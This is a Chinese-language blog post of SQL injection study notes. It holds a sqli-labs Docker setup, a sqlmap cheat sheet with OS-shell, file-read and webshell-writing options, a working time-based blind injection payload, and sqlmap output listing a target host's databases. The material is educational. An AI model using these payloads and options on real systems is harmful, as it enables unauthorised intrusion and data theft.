---
title: sql注入学习
tags:
  - sql
categories:
  - 安全
copyright: true
permalink: sql注入学习
top: 0
password: 
abstract: 输入密码继续阅读.
message: 欢迎来到我的博客，输入密码继续阅读.
date: 2020-08-22 21:09:05
---

# SQL注入基础学习与整理

## SQL 注入原理
SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。
sql注入与开发语言没有关系，所有的开发语言都可能与sql注入，产生注入关键点在于sql语法的语句编写。
## SQL 注入分类


## sqlmap工具使用

github上下载
```

```
>感受：sqlmap做的挺好，将所有的库都包含里面了，保证下载下来就能直接使用，不用安装额外的库。





## dvwa环境搭建学习sql注入部分



## sqli-libs练习平台


docker搭建sqli-libs环境

```
docker pull acgpiano/sqli-labs 
docker run -dt --name sqli -p 50000:80 --rm acgpiano/sqli-labs 
```





sqlmap进阶用法
```
-D <指定数据库> -T <指定表名> -C <指定段名> --dump 获取全部数据
-p 指定参数，或者在需要注入的参数后加*号,
例1: sqlmap -u <url> -p <parameter>
例2: sqlmap -u "http://127.0.0.1/?id=1*"

--delay		      			  #设置延时
--time-sec	      			  #在基于时间的盲注的时候，指定判断的时间，单位秒，默认5秒
--batch                       #自动注入攻击
--user                        #获取数据库用户
--is-dba                      #查看用户是否为管理员
--current-db                  #查看当前数据库
--current-user                #查看当前用户
--roles                       #获取数据库用户
--schema                      #获取数据库名字
--tables                      #获取表名
--columns                     #获取字段名
--os-cmd=CMD                  #执行一句系统命令
--os-shell                    #创建一个对方操作系统的shell，远程执行系统命令
--sql-shell                   #创建一个sqlshell
--sql-query=QUERY             #执行一个sql语句。
--file-read=RFILE             #读取目标站点的一个文件。例： --file-read="/etc/password"
--file-write=WFILE            #写入到目标站点的一个文件，通常和--sql-query 连用。例： --sql-query="select "一句话木马" --file-write="shell.php"
--file-dest=DFILE             #使用绝对路径写入。

--proxy="<代理地址>"           #设置代理地址，一般配合burpsuite使用
例：sqlmap -u <url> --proxy="http://192.168.1.55:3333"

--identify-waf                #检测Waf
例：sqlmap -u <url> --identify-waf

--tamper=unmagicquotes        #如果存在WAF可以使用脚本进行绕过
--skp-waf                     #绕过waf检测
--os=<OS>                     #指定操作系统

--technique  <B,Q,T,U,E,S>    #指定sqlmap注入方式，可节省时间，如果是宽字节注入，则需使用--tamper=unmagicquotes

例如指定使用时间盲注：sqlmap -u <url> --technique T
B: 基于Boolean的盲注（Boolean based blind）
Q: 内联查询（inlin queries）
T: 基于时间的盲注（time based blind）
U: 联合查询（union query based）
E: 错误（error based）
S: 栈查询（stack queries）


--dbms=<mysql,mssql,oracle,db2…> 指定数据库，可节省时间
例：sqlmap -u <url> --dbms=mysql

-v <0-6> 指定回显信息详细级别
例：sqlmap -u <url> -v 3
0：只显示Python的tracebacks信息、错误信息[ERROR]和关键信息[CRITICAL]；
1：同时显示普通信息[INFO]和警告信息[WARNING]；
2：同时显示调试信息[DEBUG]；
3：同时显示注入使用的攻击荷载；
4：同时显示HTTP请求；
5：同时显示HTTP响应头；
6：同时显示HTTP响应体。

--level <1-5>  #测等级,1-5，默认lv1，等级越高，payload越多，速度越慢。 lv2:cookie lv3:user-agent,referer lv5:host
--risk <1-3>   #升高风险等级会增加数据被篡改的风险。risk 2：基于事件的测试 risk 3：or语句的测试;risk  4：update的测试

```
sqlmap跑post注入，可与bp结合

















```
view=month&starttime=1595779200') AND (SELECT 6129 FROM (SELECT(SLEEP(5)))lWYm) AND ('nXWx'='nXWx&endtime=1599408000&callback=undefined
```
```
sqlmap identified the following injection point(s) with a total of 445 HTTP(s) requests:
---
Parameter: starttime (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=month&starttime=1595779200') AND (SELECT 6129 FROM (SELECT(SLEEP(5)))lWYm) AND ('nXWx'='nXWx&endtime=1599408000&callback=undefined
---
[12:01:43] [INFO] the back-end DBMS is MySQL
[12:01:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
back-end DBMS: MySQL >= 5.0.12
[12:01:44] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 4 times
[12:01:44] [INFO] fetched data logged to text files under 'C:\Users\YQ5\AppData\Local\sqlmap\output\192.168.199.208'
[12:01:44] [WARNING] you haven't updated sqlmap for more than 72 days!!!

[*] ending @ 12:01:44 /2020-08-23/

```

```
available databases [8]:
[*] BUS
[*] crscell
[*] information_schema
[*] mysql
[*] performance_schema
[*] TD_APP
[*] TD_OA
[*] TD_OA_ARCHIVE
```
```
post_tel
Database: BUS
[1 table]
+----------+
| post_tel |
+----------+
```